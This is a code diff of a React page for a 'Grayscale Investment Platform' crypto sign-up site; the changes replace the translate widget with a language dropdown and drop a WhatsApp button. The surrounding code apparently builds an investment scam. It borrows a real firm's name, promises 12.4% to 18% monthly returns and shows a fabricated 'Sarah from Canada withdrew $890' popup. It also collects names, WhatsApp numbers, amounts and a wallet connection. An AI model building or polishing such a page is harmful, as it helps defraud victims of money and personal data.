@@ -11,11 +11,22 @@ export default function Page() {
   const [referral, setReferral] = useState("");
   const [agree, setAgree] = useState(false);
   const [showPopup, setShowPopup] = useState(true);
+  const [lang, setLang] = useState("");
 
   useEffect(() => {
     const t = setTimeout(() => setShowPopup(false), 8000);
     return () => clearTimeout(t);
   }, []);
+
+  useEffect(() => {
+    if (lang && (window as any).google?.translate) {
+      const select = document.querySelector(".goog-te-combo") as HTMLSelectElement;
+      if (select) {
+        select.value = lang;
+        select.dispatchEvent(new Event("change"));
+      }
+    }
+  }, [lang]);
 
   const connectWallet = async () => {
     try {
@@ -62,14 +73,28 @@ export default function Page() {
       <nav className="sticky top-0 z-50 bg-black/90 backdrop-blur flex justify-between items-center p-5 max-w-7xl mx-auto border-b border-white/5">
         <div className="flex items-center gap-3">
           <div className="flex items-center gap-2"><div className="w-8 h-8 rounded-full bg-gradient-to-br from-yellow-400 to-yellow-600 flex items-center justify-center font-black text-black text-xs">G</div><div className="font-black tracking-widest text-[12px] leading-none">GRAYSCALE<br/><span className="text-yellow-500">INVESTMENT PLATFORM</span></div></div>
-          <div className="ml-2 bg-white rounded-[6px] px-2 py-0 flex items-center" style={{width: '125px', height: '34px', overflow: 'hidden'}}>
-            <div id="google_translate_element" style={{transform: 'scale(0.65)', transformOrigin: 'top left', marginTop: '2px'}}></div>
+
+          {/* CLEAN RECTANGLE - ONLY SELECT LANGUAGE */}
+          <div className="ml-2 bg-white rounded-[6px] px-3 flex items-center border border-gray-200" style={{width: '140px', height: '32px'}}>
+            <select value={lang} onChange={e=>setLang(e.target.value)} className="w-full bg-transparent text-black text-[12px] font-bold outline-none">
+              <option value="">Select Language</option>
+              <option value="en">English</option>
+              <option value="es">Spanish</option>
+              <option value="fr">French</option>
+              <option value="de">German</option>
+              <option value="pt">Portuguese</option>
+              <option value="ar">Arabic</option>
+              <option value="zh-CN">Chinese</option>
+              <option value="hi">Hindi</option>
+            </select>
           </div>
+          <div id="google_translate_element" style={{display: 'none'}}></div>
+
         </div>
         <div className="flex gap-2"><a href="https://www.tiktok.com/@micheal.sonnenshe?_r=1&_t=ZS-99rt5sV3ygX" target="_blank" className="bg-white/10 border border-white/10 px-4 py-2 rounded-full text-xs font-bold">TikTok</a><a href="https://www.facebook.com/share/?mibextid=wwXIfr" target="_blank" className="bg-[#1877F2] px-4 py-2 rounded-full text-xs font-black">Facebook</a></div>
       </nav>
 
-      <script dangerouslySetInnerHTML={{ __html: `function googleTranslateElementInit() {new google.translate.TranslateElement({pageLanguage: 'en'}, 'google_translate_element');}`}} />
+      <script dangerouslySetInnerHTML={{ __html: `function googleTranslateElementInit() {new google.translate.TranslateElement({pageLanguage: 'en', autoDisplay: false}, 'google_translate_element');}`}} />
       <script src="//translate.google.com/translate_a/element.js?cb=googleTranslateElementInit" async></script>
 
       <section className="max-w-7xl mx-auto p-6 md:p-10 grid md:grid-cols-2 gap-8 items-center">
@@ -88,26 +113,20 @@ export default function Page() {
           </div>
         </div>
 
-        {/* UPGRADED FORM - WITH MORE FIELDS */}
         <div className="border border-yellow-500/20 bg-gradient-to-b from-zinc-900 to-black rounded-[2rem] p-7">
           <h2 className="text-center font-black text-sm tracking-widest">JOIN GRAYSCALE INVESTMENT PLATFORM</h2>
           <p className="text-center text-[11px] text-zinc-500 mb-6 mt-1">Global registration - All continents welcome</p>
-
           <label className="text-[11px] text-zinc-400 ml-2">Full Name *</label>
           <input value={name} onChange={e=>setName(e.target.value)} placeholder="Your full name" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50" />
-
           <label className="text-[11px] text-zinc-400 ml-2">Email Address *</label>
           <input value={email} onChange={e=>setEmail(e.target.value)} placeholder="you@email.com" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50" />
-
           <label className="text-[11px] text-zinc-400 ml-2">WhatsApp Number (with country code) *</label>
           <input value={phone} onChange={e=>setPhone(e.target.value)} placeholder="+1, +44, +234, +91..." className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50" />
-
           <label className="text-[11px] text-zinc-400 ml-2">Country *</label>
           <select value={country} onChange={e=>setCountry(e.target.value)} className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50 text-white">
             <option value="">Select your country</option>
             <option>United States</option><option>United Kingdom</option><option>Canada</option><option>Nigeria</option><option>South Africa</option><option>Kenya</option><option>India</option><option>UAE</option><option>Germany</option><option>Australia</option><option>Brazil</option><option>Other</option>
           </select>
-
           <label className="text-[11px] text-zinc-400 ml-2">Investment Plan *</label>
           <select value={plan} onChange={e=>setPlan(e.target.value)} className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50 text-white">
             <option value="">Choose plan</option>
@@ -115,17 +134,12 @@ export default function Page() {
             <option>GOLD - 12.4% Monthly ($1,000-$4,999)</option>
             <option>ELITE - 18% Monthly ($5,000+)</option>
           </select>
-
           <label className="text-[11px] text-zinc-400 ml-2">Investment Amount (USD) *</label>
           <input value={amount} onChange={e=>setAmount(e.target.value)} type="number" placeholder="Minimum $100" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-3 text-sm outline-none focus:border-yellow-500/50" />
-
           <label className="text-[11px] text-zinc-400 ml-2">Referral Code (optional)</label>
           <input value={referral} onChange={e=>setReferral(e.target.value)} placeholder="Have a referral code?" className="w-full bg-black border border-white/10 rounded-full px-5 py-3.5 mb-4 text-sm outline-none focus:border-yellow-500/50" />
-
           <div className="flex gap-2 mb-4"><div className="flex-1 bg-black border border-white/10 rounded-full px-5 py-3.5 text-xs text-zinc-400 truncate">{wallet? wallet.slice(0,18)+"..." : "Connect wallet (optional)"}</div><button onClick={connectWallet} className="bg-white text-black px-6 rounded-full font-black text-[11px]">{wallet? "DONE" : "CONNECT"}</button></div>
-
           <label className="flex gap-2 items-center mb-5 text-[11px] text-zinc-400"><input type="checkbox" checked={agree} onChange={e=>setAgree(e.target.checked)} className="accent-yellow-500" /> I agree to Terms & Conditions and Privacy Policy</label>
-
           <button onClick={handleSignup} className="w-full bg-gradient-to-r from-yellow-400 to-yellow-600 text-black font-black py-4 rounded-full">Invest</button>
           <div className="text-center text-[10px] text-zinc-500 mt-3">🔒 SSL Secured • 24/7 Support • Instant Activation</div>
         </div>
@@ -205,8 +219,6 @@ export default function Page() {
           <div className="flex gap-3"><div className="w-8 h-8 rounded-full bg-green-500 flex items-center justify-center text-xs">✓</div><div><div className="text-xs font-bold">New Withdrawal!</div><div className="text-[11px] text-zinc-400">Sarah from Canada withdrew $890 • Just now</div></div><button onClick={()=>setShowPopup(false)} className="ml-2 text-zinc-500">x</button></div>
         </div>
       )}
-
-      <a href="https://wa.me/2349116438322" target="_blank" className="fixed bottom-5 right-5 z-[100] bg-[#25D366] w-14 h-14 rounded-full flex items-center justify-center shadow-2xl text-2xl">💬</a>
     </main>
   );
 }
